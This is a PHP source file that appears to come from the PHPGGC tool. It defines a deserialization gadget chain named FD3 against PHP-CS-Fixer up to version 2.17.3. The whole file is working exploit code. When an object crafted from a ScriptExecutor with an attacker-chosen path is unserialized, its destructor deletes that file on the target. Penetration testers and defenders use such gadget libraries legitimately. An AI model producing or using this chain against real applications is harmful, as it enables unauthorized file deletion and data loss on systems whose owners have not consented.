<?php

namespace GadgetChain\PHPCSFixer;

class FD3 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '<= 2.17.3';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $remote_path = $parameters["remote_path"];

        return new \Keradus\CliExecutor\ScriptExecutor($remote_path);
    }
}
